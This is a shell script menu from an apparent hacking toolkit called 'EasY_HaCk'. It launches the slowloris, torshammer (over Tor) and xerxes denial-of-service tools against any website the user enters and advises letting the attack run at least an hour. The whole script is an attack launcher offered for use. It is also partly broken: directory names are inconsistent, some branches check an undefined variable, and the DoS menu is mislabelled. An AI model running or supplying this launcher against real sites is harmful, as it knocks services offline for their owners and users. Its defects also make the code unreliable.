#!/bin/sh
clear
#colour

R='\033[1;31m'
B='\033[0;34m'
C='\033[0;36m'
G='\033[1;32m'
W='\033[1;37m'
Y='\033[0;33m'
Y2='\033[1;33m'

#banner
echo "██████  ██████   ██████  ███████ "
echo "██   ██ ██   ██ ██    ██ ██      "
echo "██   ██ ██   ██ ██    ██ ███████"
echo "██   ██ ██   ██ ██    ██      ██ "
echo "██████  ██████   ██████  ███████ "

#code
echo $Y2
echo $R"01$G)$R ——————–––>$W slowloris."
echo $R"02$G)$R ——————–––>$W torshammer (Anonymous Attacker) "
echo $R"03$G)$R ——————–––>$W xerxes"
echo $R"00$G)$R ——––>$Y2 BACK "  
echo $R"XX$G) ——––>$Y2 EXIT "
echo " "
echo -n $R"[$W"Inf0rmati0n Gathering"$R]$W"~"$R"'#': 
read zaki
if [ $zaki = "1" ] || [ $zaki = "01" ];
then
echo -n $R"Put the Website to Attack$Y : " 
read site
echo $W"Let the Attack at least$Y2 1h$W to have good result "$G
sleep 3
python3 $PREFIX/share/EasY_HaCkc/.modules/.slowloris/slowloris.py $site -p 80 -s 500 -v -ua
echo -n $R" Press" ENTRE to back" " 
read ENTRE
$PREFIX/share/EasY_HaCk/.modules/.dos
elif [ $zaki = "2" ] || [ $nico = "02" ];
then
echo
echo $W"to run this command you must run$R tor service$W in new Terminal "
sleep 6
clear
echo $W"open new session and type$G =====>$R tor"
sleep 10
echo $W"Let the Attack at least$Y2 1h$W to have good result "$G
sleep 3
echo -n $R"Put the Website to Attack$Y : " $G
read site
python2 $PREFIX/share/EasY_HaCkc/.modules/.torshammer/torshammer.py --tor -t $site -r 256 -T
echo -n $R" Press" ENTRE to back" " 
read ENTRE
$PREFIX/share/EasY_HaCkc/.modules/.dos
elif [ $zaki = "3" ] || [ $zaki = "03" ];
then 
echo
clear
echo $W"Let the Attack at least$Y2 1h$W to have good result "
sleep 1
echo -n $R"Put the Website to Attack$Y : " $G
read site
$PREFIX/share/EasY_HaCk/.modules/.xerxes/xerxes $site 80
echo -n $R"Press" ENTRE to back" " 
read ENTRE
$PREFIX/share/EasY_HaCk/.modules/.dos
elif [ $zaki = "00" ] || [ $zaki = "0" ];
then
clear
echo "EasY_HacK "
sleep 0.5
clear
echo "EasY_HacK ./ "
sleep 0.5
clear
echo "EasY_HacK ..\ "
sleep 0.5
clear
echo "EasY_HacK .../ "
sleep 0.5
clear
echo "EasY_HacK ....\ "
sleep 0.5
clear
echo "EasY_HacK ...../ "
sleep 0.5
clear
echo "EasY_HacK ......\ "
sleep 0.5
clear
echo "EasY_HacK ......./ "
sleep 0.5
clear
echo "EasY_HacK ........\ "
sleep 0.5
clear
echo "EasY_HacK ........./ "
sleep 0.5
clear
echo "EasY_HacK ...........\ "
$PREFIX/share/EasY_HaCk/.modules/.web
elif [ $zaki = "X" ] || [ $zaki = "x" ] || [ $zaki = "xx" ] || [ $nico = "XX" ] ;
then
clear
echo "$R E.\ "
sleep 1
clear
echo "$R EX../ "
sleep 1
clear
echo "$R EXI...\ "
sleep 1
clear
echo "$R EXIT..../ "
sleep 1
exit 
else
clear
echo $Y" Wrong Input..."
sleep 1
sh $0
fi
